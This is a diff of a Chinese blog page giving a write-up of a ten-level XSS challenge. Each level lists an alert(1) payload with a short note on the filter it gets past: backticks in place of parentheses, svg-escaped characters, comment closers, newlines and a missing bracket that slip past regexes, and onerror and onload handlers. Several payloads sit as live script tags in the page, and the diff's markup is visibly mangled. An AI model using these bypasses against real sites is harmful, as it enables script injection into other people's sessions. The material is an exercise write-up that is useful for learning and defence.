@@ -5,15 +5,15 @@
   
   <title>xss小闯关 | 给我坐下犬夜叉的blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 alert(1)  0x01alert(1)  &#x2F;&#x2F;普通的闭合 0x02“&gt;alert(1)  &#x2F;&#x2F;用于input类型的闭合 0x03 alert&#96;1&#96; &#x2F;&#x2F;用&#96;绕过()的过滤 ，注意&#96;要紧贴alter  0x04 &lt;svg》 alert&amp;#x60;1&amp;#x60;过滤了 （） and &#96;      用标签可以解析 html转义字符 0x05–!&gt;alert(1)–!&amp;g">
+  <meta name="description" content="0x00 “alert(1)” 0x01“alert(1)  &#x2F;&#x2F;普通的闭合” 0x02””&gt;alert(1)  &#x2F;&#x2F;用于input类型的闭合“ 0x03 “alert1 &#x2F;&#x2F;用绕过()的过滤 ，注意要紧贴alter” 0x04 “” alert&amp;#x60;1&amp;#x60;过滤了 （） and &#96;      用标签可以解析 html转义字符”” 0x05“”–!&gt;alert(1)–!&amp;g">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss小闯关">
 <meta property="og:url" content="https://sovegetable.github.io/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/index.html">
 <meta property="og:site_name" content="给我坐下犬夜叉的blog">
-<meta property="og:description" content="0x00 alert(1)  0x01alert(1)  &#x2F;&#x2F;普通的闭合 0x02“&gt;alert(1)  &#x2F;&#x2F;用于input类型的闭合 0x03 alert&#96;1&#96; &#x2F;&#x2F;用&#96;绕过()的过滤 ，注意&#96;要紧贴alter  0x04 &lt;svg》 alert&amp;#x60;1&amp;#x60;过滤了 （） and &#96;      用标签可以解析 html转义字符 0x05–!&gt;alert(1)–!&amp;g">
+<meta property="og:description" content="0x00 “alert(1)” 0x01“alert(1)  &#x2F;&#x2F;普通的闭合” 0x02””&gt;alert(1)  &#x2F;&#x2F;用于input类型的闭合“ 0x03 “alert1 &#x2F;&#x2F;用绕过()的过滤 ，注意要紧贴alter” 0x04 “” alert&amp;#x60;1&amp;#x60;过滤了 （） and &#96;      用标签可以解析 html转义字符”” 0x05“”–!&gt;alert(1)–!&amp;g">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-09-15T09:49:04.644Z">
-<meta property="article:modified_time" content="2020-09-15T09:48:59.640Z">
+<meta property="article:modified_time" content="2020-09-15T11:57:54.261Z">
 <meta property="article:author" content="给我坐下犬夜叉">
 <meta property="article:tag" content="犬夜叉">
 <meta name="twitter:card" content="summary">
@@ -107,27 +107,25 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>0x00</p>
-<script>alert(1)</script>
-
-<p>0x01<br><script>alert(1)</script>  //普通的闭合</p>
-<p>0x02<br>“&gt;<script>alert(1)</script>  //用于input类型的闭合</p>
+<p>“<script>alert(1)</script>”</p>
+<p>0x01<br>“<script>alert(1)</script>  //普通的闭合”</p>
+<p>0x02<br>””&gt;<script>alert(1)</script>  //用于input类型的闭合“</p>
 <p>0x03</p>
-<script>alert`1`</script> //用`绕过()的过滤 ，注意`要紧贴alter
-
+<p>“<script>alert<code>1</code></script> //用<code>绕过()的过滤 ，注意</code>要紧贴alter”</p>
 <p>0x04</p>
-<p>&lt;svg》 <script>alert&#x60;1&#x60;</script><br>过滤了 （） and `      用<svg>标签可以解析 html转义字符</svg></p>
-<p>0x05<br>–!&gt;<script>alert(1)</script><br>–!&gt; 和–&gt;都可以闭合</p>
-<p>0x06<br>type=”image” src=”” onerror<br>=alert(1)</p>
+<p>“”<svg> <script>alert&#x60;1&#x60;</script><br/>过滤了 （） and `      用<svg>标签可以解析 html转义字符””</svg></svg></p>
+<p>0x05<br>“”–!&gt;<script>alert(1)</script><br>–!&gt; 和–&gt;都可以闭合””</p>
+<p>0x06<br>“type=”image” src=”” onerror<br>=alert(1)”</p>
 <p>使用回车过滤正则，onerror报错时触发</p>
-<p>0x07</p>
-<body onload="alert`1`" （有空格） <p>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空.<br>可以通过少输入一个&gt;来绕过正则,但仍然可以执行.<br>onload 事件会在页面或图像加载完成后立即发生。<br>onload 通常用于 <body> 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码。<p></p>
+<p>0x07<br>“”&lt;body onload=alert<code>1</code> （有空格）””</p>
+<p>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空.<br>可以通过少输入一个&gt;来绕过正则,但仍然可以执行.<br>onload 事件会在页面或图像加载完成后立即发生。<br>onload 通常用于”” <body>“” 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码。</body></p>
 <p>0x08<br>&lt;/style</p>
 <blockquote>
-<script>alert(1)</script>
+<p>“”<script>alert(1)</script>“”</p>
 <p>同上换行绕过</p>
 </blockquote>
-<p>0x09<br><a href="https://www.segmentfault.com&quot;&gt;" target="_blank" rel="noopener">https://www.segmentfault.com&quot;&gt;</a><script>alert(1)</script><br>先输入网址通过匹配，然后闭合。这里我发现<script>中间是不能有>的否则语句无效。</p>
-</script></p></body></body>
+<p>0x09<br>“<a href="https://www.segmentfault.com&quot;&gt;" target="_blank" rel="noopener">https://www.segmentfault.com&quot;&gt;</a><script>alert(1)</script><br>先输入网址通过匹配，然后闭合。这里我发现<script>中间是不能有>的否则语句无效。""</p>
+</script></p>
       
     </div>
     <footer class="article-footer">
